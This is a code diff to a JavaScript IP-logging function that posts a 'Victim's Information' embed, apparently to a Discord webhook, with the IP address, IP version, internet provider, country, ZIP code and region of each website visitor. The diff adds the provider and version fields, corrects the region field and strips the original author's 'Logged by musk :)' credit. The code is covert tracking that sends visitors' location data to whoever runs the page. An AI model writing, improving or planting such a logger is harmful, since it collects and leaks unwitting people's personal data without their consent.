@@ -41,12 +41,16 @@ async function IP_Info(){
         body: JSON.stringify({
           content:"",
           embeds: [{
-              title: "Victim IP",
+              title: "Victim's Information",
               type:"rich",
               color: "12223968",
               description: "```IP information of the recent website visitor.```",
-              fields: [{
-                name: "IP", value: `${value.ip}`, inline: false
+              fields: [
+              {
+                name: "IP", value: `${value.ip}  (**${value.version}**)`, inline: false
+              },
+              {
+                name: "Provider", value: `${value.org}`, inline: false
               },
               {
                 name: "Country", value: `${value.country_name}`, inline: false
@@ -58,12 +62,12 @@ async function IP_Info(){
                 name: "ZIP", value: `${value.postal}`, inline: false
               },
               {
-                name: "Region", value: `${value.city}`, inline: false
+                name: "Region", value: `${value.region}`, inline: false
               }
               ],
               footer: {
-                text: "Logged by musk :)",
-                icon_url: "https://avatars.githubusercontent.com/u/62134419?v=4"
+                text: "",
+                icon_url: ""
               },
               author: {
                 name: "",
